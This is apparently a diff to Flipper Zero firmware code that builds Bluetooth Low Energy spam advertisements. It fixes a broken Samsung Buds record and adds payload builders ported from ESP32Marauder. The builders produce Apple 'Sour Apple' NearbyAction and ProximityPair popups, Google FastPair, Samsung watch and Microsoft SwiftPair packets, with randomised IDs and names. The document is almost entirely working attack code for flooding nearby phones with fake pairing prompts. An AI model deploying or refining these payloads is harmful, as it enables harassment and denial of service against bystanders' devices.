@@ -565,8 +565,10 @@ static inline uint8_t ble_spam_build_samsung_buds(uint8_t* buf, uint8_t r, uint8
     buf[i++] = 0x06; buf[i++] = 0x3C; buf[i++] = 0x94; buf[i++] = 0x8E;
     buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00;
     buf[i++] = 0xC7; buf[i++] = 0x00;
-    /* Trailing truncated record: length=16 claimed, only 2 data bytes present */
-    buf[i++] = 0x10; buf[i++] = 0xFF; buf[i++] = 0x75;
+    /* Trailing second Samsung record. It must be structurally valid: NimBLE
+     * rejects the whole payload when a length field overruns the buffer, which
+     * is why Samsung Buds previously produced no advertisement at all. */
+    buf[i++] = 0x02; buf[i++] = 0xFF; buf[i++] = 0x75;
     return i; /* 31 */
 }
 
@@ -757,4 +759,136 @@ static inline uint8_t ble_spam_build_pair_spam(uint8_t* buf, const char* name) {
     i += name_len;
     
     return i;
+}
+
+// ===========================================================================
+// ESP32Marauder payload set
+//
+// Ported from justcallmekoko/ESP32Marauder, esp32_marauder/WiFiScan.cpp,
+// WiFiScan::GetUniversalAdvertisementData(). Marauder emits raw AD structures
+// without a Flags field, so these builders match that byte-for-byte.
+// ===========================================================================
+
+static const uint16_t mar_apple_device_ids[] = {
+    0x0220, 0x0F20, 0x1320, 0x1420, 0x0E20, 0x0A20, 0x0055,
+    0x0C20, 0x1120, 0x0520, 0x1020, 0x0920, 0x1720, 0x1220, 0x1620,
+};
+
+#define MAR_APPLE_DEVICE_ID_COUNT \
+    (sizeof(mar_apple_device_ids) / sizeof(mar_apple_device_ids[0]))
+
+static const uint8_t mar_apple_actions[] = {
+    0x27, 0x09, 0x02, 0x1E, 0x2B, 0x2F, 0x01, 0x06, 0x20,
+};
+
+#define MAR_APPLE_ACTION_COUNT (sizeof(mar_apple_actions) / sizeof(mar_apple_actions[0]))
+
+/** Marauder generateRandomName(char*, length): first char upper, rest lower. */
+static inline void ble_spam_random_name(char* out, size_t len) {
+    static const char lower[] = "abcdefghijklmnopqrstuvwxyz";
+    if(!out || len == 0) return;
+    out[0] = (char)('A' + (furi_hal_random_get() % 26));
+    for(size_t i = 1; i + 1 < len; i++) {
+        out[i] = lower[furi_hal_random_get() % (sizeof(lower) - 1)];
+    }
+    out[len - 1] = '\0';
+}
+
+/** Marauder generateRandomName(): 1..10 mixed-case characters. */
+static inline void ble_spam_random_name_mixed(char* out, size_t cap) {
+    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    if(!out || cap == 0) return;
+    size_t len = 1 + (furi_hal_random_get() % 10);
+    if(len > cap - 1) len = cap - 1;
+    for(size_t i = 0; i < len; i++) {
+        out[i] = charset[furi_hal_random_get() % (sizeof(charset) - 1)];
+    }
+    out[len] = '\0';
+}
+
+/** Apple NearbyAction (Sour Apple). Marauder layout, 11 bytes, no Flags. */
+static inline uint8_t ble_spam_build_mar_apple_action(uint8_t* buf, uint8_t action_id) {
+    uint8_t i = 0;
+    buf[i++] = 0x0A; buf[i++] = 0xFF; buf[i++] = 0x4C; buf[i++] = 0x00;
+    buf[i++] = 0x0F; buf[i++] = 0x05; buf[i++] = 0xC0;
+    buf[i++] = action_id;
+    furi_hal_random_fill_buf(&buf[i], 3); i += 3;
+    return i; /* 11 */
+}
+
+/** Apple ProximityPair device popup. Marauder layout, 21 bytes, no Flags. */
+static inline uint8_t ble_spam_build_mar_apple_device(uint8_t* buf, uint16_t device_id) {
+    uint8_t i = 0;
+    buf[i++] = 0x14; buf[i++] = 0xFF; buf[i++] = 0x4C; buf[i++] = 0x00;
+    buf[i++] = 0x07; buf[i++] = 0x0F; buf[i++] = 0x00;
+    buf[i++] = (uint8_t)(device_id >> 8);
+    buf[i++] = (uint8_t)(device_id & 0xFF);
+    buf[i++] = 0xAC; buf[i++] = 0x90; buf[i++] = 0x85;
+    buf[i++] = 0x75; buf[i++] = 0x94; buf[i++] = 0x65;
+    furi_hal_random_fill_buf(&buf[i], 5); i += 5;
+    buf[i++] = 0x00;
+    return i; /* 21 */
+}
+
+/** Sour Apple: 90% action modal, 10% device popup (Marauder behaviour). */
+static inline uint8_t ble_spam_build_mar_sour_apple(uint8_t* buf) {
+    if((furi_hal_random_get() % 10) > 0) {
+        uint8_t action = mar_apple_actions[furi_hal_random_get() % MAR_APPLE_ACTION_COUNT];
+        return ble_spam_build_mar_apple_action(buf, action);
+    }
+    uint16_t id = mar_apple_device_ids[furi_hal_random_get() % MAR_APPLE_DEVICE_ID_COUNT];
+    return ble_spam_build_mar_apple_device(buf, id);
+}
+
+/** Google FastPair Smart Controller. Marauder fixed model, 14 bytes. */
+static inline uint8_t ble_spam_build_mar_google(uint8_t* buf) {
+    uint8_t i = 0;
+    buf[i++] = 0x03; buf[i++] = 0x03; buf[i++] = 0x2C; buf[i++] = 0xFE;
+    buf[i++] = 0x06; buf[i++] = 0x16; buf[i++] = 0x2C; buf[i++] = 0xFE;
+    buf[i++] = 0x00; buf[i++] = 0xB7; buf[i++] = 0x27;
+    buf[i++] = 0x02; buf[i++] = 0x0A;
+    buf[i++] = (uint8_t)((furi_hal_random_get() % 120) - 100);
+    return i; /* 14 */
+}
+
+/** Samsung watch. Marauder layout, 15 bytes, no Flags. */
+static inline uint8_t ble_spam_build_mar_samsung_watch(uint8_t* buf, uint8_t model) {
+    uint8_t i = 0;
+    buf[i++] = 0x0E; buf[i++] = 0xFF; buf[i++] = 0x75; buf[i++] = 0x00;
+    buf[i++] = 0x01; buf[i++] = 0x00; buf[i++] = 0x02; buf[i++] = 0x00;
+    buf[i++] = 0x01; buf[i++] = 0x01; buf[i++] = 0xFF; buf[i++] = 0x00;
+    buf[i++] = 0x00; buf[i++] = 0x43;
+    buf[i++] = model;
+    return i; /* 15 */
+}
+
+/** Microsoft SwiftPair with a random device name. Marauder layout. */
+static inline uint8_t ble_spam_build_mar_swiftpair(uint8_t* buf, const char* name) {
+    size_t name_len = strlen(name);
+    if(name_len > 24) name_len = 24;
+    uint8_t i = 0;
+    buf[i++] = (uint8_t)(6 + name_len);
+    buf[i++] = 0xFF;
+    buf[i++] = 0x06; buf[i++] = 0x00;
+    buf[i++] = 0x03; buf[i++] = 0x00; buf[i++] = 0x80;
+    memcpy(&buf[i], name, name_len); i += name_len;
+    return i;
+}
+
+/** Flipper Zero advertisement. Marauder layout with a valid mfr length. */
+static inline uint8_t ble_spam_build_mar_flipper(uint8_t* buf, const char* name) {
+    size_t name_len = strlen(name);
+    if(name_len > 5) name_len = 5;
+    uint8_t i = 0;
+    buf[i++] = 0x02; buf[i++] = 0x01; buf[i++] = 0x06;
+    buf[i++] = (uint8_t)(name_len + 1); buf[i++] = 0x09;
+    memcpy(&buf[i], name, name_len); i += name_len;
+    buf[i++] = 0x03; buf[i++] = 0x02;
+    buf[i++] = (uint8_t)(0x80 + (furi_hal_random_get() % 3) + 1);
+    buf[i++] = 0x30;
+    buf[i++] = 0x02; buf[i++] = 0x0A; buf[i++] = 0x00;
+    buf[i++] = 0x09; buf[i++] = 0xFF; buf[i++] = 0xBA; buf[i++] = 0x0F;
+    buf[i++] = 0x4C; buf[i++] = 0x75; buf[i++] = 0x67; buf[i++] = 0x26;
+    buf[i++] = 0xE1; buf[i++] = 0x80;
+    return i; /* 27 */
 }
